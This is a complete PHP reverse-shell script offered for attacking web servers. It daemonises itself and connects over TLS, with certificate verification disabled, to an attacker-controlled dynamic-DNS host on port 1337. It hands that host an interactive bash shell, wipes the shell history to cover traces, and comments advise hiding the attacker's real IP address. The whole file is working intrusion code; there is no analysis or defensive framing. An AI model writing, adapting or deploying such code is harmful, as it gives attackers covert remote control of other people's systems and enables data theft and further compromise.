<?php

declare(strict_types=1);

final class Config {
	// whether to run reverse shell in background?
	// disable this only if php does not support pcntl_fork and posix_setsid
	const DAEMONIZE_PROCESS = true;
	// whether to use encryption?
	// always use encryption when attacking!
	// disable this only for netcat compatibility
	const ENCRYPTED_SHELL = true;
	// https://0xffsec.com/handbook/shells/full-tty/
	// stabilisation enables full use of shell (e.g. you can use nano)
	const STABILIZE_SHELL = true;

	// https://freemyip.com is useful to hide real IPv4 address
	// you can perform attack and update IPv4 address to fake one
	const REMOTE_HOST = "my-domain.freemyip.com";
	// you must be listening on this port
	// it's recommended to use ISP without NAT
	const REMOTE_PORT = 1337;

	// maximum transmission unit in bytes
	// can be increased if local network is used
	const CONNECTION_MTU = 1492;
	// delay in microseconds between reads
	// default is 50 ms, which should be enough for text mode
	const CONNECTION_DELAY = 50_000;
	// connection timeout in seconds
	const CONNECTION_TIMEOUT = 30;

	// use this command to get rows from local terminal:
	// stty -a | awk -F'[ ;]' '/rows/ { print $6 }'
	const TTY_ROWS = 45;
	// use this command to get columns from local terminal:
	// stty -a | awk -F'[ ;]' '/columns/ { print $9 }'
	const TTY_COLUMNS = 180;

	private function __construct() { /* NOP */ }
}

function dns_query(string $domain): ?string {
	$ch = curl_init("https://dns.google/resolve?" . http_build_query([
		"name" => $domain,
		"type" => "A",
	]));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ret = curl_exec($ch);
	curl_close($ch);

	return $ret !== false ? (
		json_decode($ret, true)["Answer"][0]["data"] ?? null
	) : null;
}

set_time_limit(0);

if (Config::DAEMONIZE_PROCESS) {
	$pid = pcntl_fork();
	if ($pid === -1) {
		die("can't fork\n");
	} else if ($pid === 0) {
		exit();
	}

	$sid = posix_setsid();
	if ($sid === -1) {
		die("can't setsid\n");
	}

	umask(0);
}

$context = Config::ENCRYPTED_SHELL ? stream_context_create([
	"ssl" => [
		"verify_peer" => false,
		"verify_peer_name" => false,
	]
]) : null;
$protocol = Config::ENCRYPTED_SHELL ? "ssl://" : "tcp://";
$hostname = dns_query(Config::REMOTE_HOST) ?? die("can't resolve hostname\n");
$address = $protocol . $hostname . ":" . Config::REMOTE_PORT;

$socket = @stream_socket_client($address, $errno, $errstr, Config::CONNECTION_TIMEOUT, STREAM_CLIENT_CONNECT, $context);
if ($socket === false) {
	die("can't connect to remote host\n");
}

$descriptor_spec = [
	0 => ["pipe", "r"],
	1 => ["pipe", "w"],
	2 => ["pipe", "w"],
];
$process = proc_open("/bin/bash -i", $descriptor_spec, $pipes);
if ($process === false) {
	die("can't create shell\n");
}

if (Config::STABILIZE_SHELL) {
	fwrite($pipes[0], "python3 -c \"import pty; pty.spawn('/bin/bash');\"\n");
	fwrite($pipes[0], "unset HISTFILE && history -c && history -w\n");
	fwrite($pipes[0], "export TERM=xterm\n");
	fwrite($pipes[0], "stty rows " . Config::TTY_ROWS . " cols " . Config::TTY_COLUMNS . "\n");
	fwrite($pipes[0], "clear\n");
}

stream_set_blocking($socket, false);
for ($i = 0; $i <= 2; ++$i) {
	stream_set_blocking($pipes[$i], false);
}

while (true) {
	if (feof($socket)) {
		break;
	}

	if (feof($pipes[1])) {
		break;
	}

	$r = [$socket, $pipes[1], $pipes[2]];
	$w = null;
	$e = null;

	$ret = stream_select($r, $w, $e, 0, Config::CONNECTION_DELAY);
	if ($ret > 0) {
		foreach ($r as $id => $sock) {
			$buffer = fread($sock, Config::CONNECTION_MTU);
			if ($buffer !== false) {
				if ($sock === $socket) {
					fwrite($pipes[0], $buffer);
				} else if ($sock === $pipes[1]) {
					fwrite($socket, $buffer);
				} else if ($sock === $pipes[2]) {
					fwrite($socket, $buffer);
				}
			}
		}
	}
}

fclose($socket);
for ($i = 0; $i <= 2; ++$i) {
	fclose($pipes[$i]);
}

proc_close($process);
